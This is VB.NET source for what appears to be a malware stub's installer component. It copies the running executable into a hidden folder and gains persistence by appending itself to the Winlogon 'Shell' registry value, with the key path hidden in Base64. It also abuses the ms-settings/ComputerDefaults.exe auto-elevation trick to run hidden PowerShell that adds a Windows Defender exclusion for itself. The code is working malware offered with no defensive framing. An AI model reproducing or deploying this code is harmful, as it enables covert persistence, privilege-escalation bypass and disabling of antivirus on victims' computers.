Imports Microsoft.Win32
Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Linq
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Windows.Forms

Namespace Stub

	Public NotInheritable Class Installer

		Private Sub New()
		End Sub


		Public Shared FileName As FileInfo

		Public Shared DirectoryName As DirectoryInfo
		Public Shared Sub Run(ByVal path As String, ByVal folder As String, ByVal filename As String, ByVal wdex As String)

			Installer.FileName = New FileInfo(filename)

			If path = "0" Then
				DirectoryName = New DirectoryInfo(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), folder))
			End If
			If path = "1" Then
				DirectoryName = New DirectoryInfo(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), folder))
			End If
			If path = "2" Then
				DirectoryName = New DirectoryInfo(System.IO.Path.Combine(System.IO.Path.GetTempPath(), folder))
			End If

			If Not IsInstalled() Then
				Try

					CreateDirectory()

					InstallFile()

					InstallRegistry()

					If wdex = "True" Then
						Try
						ExclusionWD()
						Catch
						End Try
					End If
				Catch
				End Try
			End If
		End Sub

		Public Shared Function IsInstalled() As Boolean
			If Application.ExecutablePath = Path.Combine(DirectoryName.FullName, FileName.Name) Then
				Return True
			Else
				Return False
			End If
		End Function

		Public Shared Sub CreateDirectory()
			If Not DirectoryName.Exists Then
			DirectoryName.Create()
			End If
			DirectoryName.Attributes = FileAttributes.Hidden
		End Sub

		Public Shared Sub InstallFile()
			Dim fullPath As String = Path.Combine(DirectoryName.FullName, FileName.Name)
			If FileName.Exists Then
				For Each process As Process In System.Diagnostics.Process.GetProcesses()
					Try
						If process.MainModule.FileName = fullPath Then
							process.Kill()
						End If
					Catch
					End Try
				Next process
				File.Delete(fullPath)
				Thread.Sleep(250)
			End If
			Using fs As New FileStream(fullPath, FileMode.Create, FileAccess.Write)
				Dim b() As Byte = File.ReadAllBytes(Application.ExecutablePath)
				fs.Write(b, 0, b.Length)
			End Using
		End Sub

		Public Shared Sub InstallRegistry()


			If GetRegKey() Is Nothing Then

				Dim data() As Byte = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c")
				Dim decode As String = Encoding.UTF8.GetString(data)

				Dim key As RegistryKey = Registry.CurrentUser.CreateSubKey(decode)

				key.SetValue("Shell", "explorer.exe, " & Path.Combine(DirectoryName.FullName, FileName.Name))
				key.Close()
			Else

				If Not GetRegKey().Contains(Path.Combine(DirectoryName.FullName, FileName.Name)) Then

					Dim setValue As String = GetRegKey().Substring(GetRegKey().Length - 1, 1)

					If setValue = "," Then
						setValue = GetRegKey() & Path.Combine(DirectoryName.FullName, FileName.Name) & ","
					Else
						setValue = GetRegKey() & "," & Path.Combine(DirectoryName.FullName, FileName.Name) & ","
					End If

					Dim data() As Byte = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=")
					Dim decode As String = Encoding.UTF8.GetString(data)

					Microsoft.Win32.Registry.CurrentUser.OpenSubKey(decode, True).SetValue("Shell", setValue)
				End If
			End If
		End Sub

		Public Shared Sub ExclusionWD()
			Try
				Dim key As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Classes\ms-settings\shell\open\command")
				key.SetValue("", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command Add-MpPreference -ExclusionPath " & ChrW(39) & Path.Combine(DirectoryName.FullName, FileName.Name) & ChrW(39))
				key.Close()

				Dim key2 As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Classes\ms-settings\shell\open\command")
				key2.SetValue("DelegateExecute", "")
				key2.Close()

				Process.Start("C:\Windows\System32\ComputerDefaults.exe")

				System.Threading.Thread.Sleep(1000)
			Catch
			End Try
		End Sub

		Public Shared Function GetRegKey() As String
			Try
				Dim data() As Byte = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c")
				Dim decode As String = Encoding.UTF8.GetString(data)

				Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey(decode)
				Return key.GetValue("Shell").ToString()
			Catch
				Return Nothing
			End Try
		End Function

	End Class

End Namespace


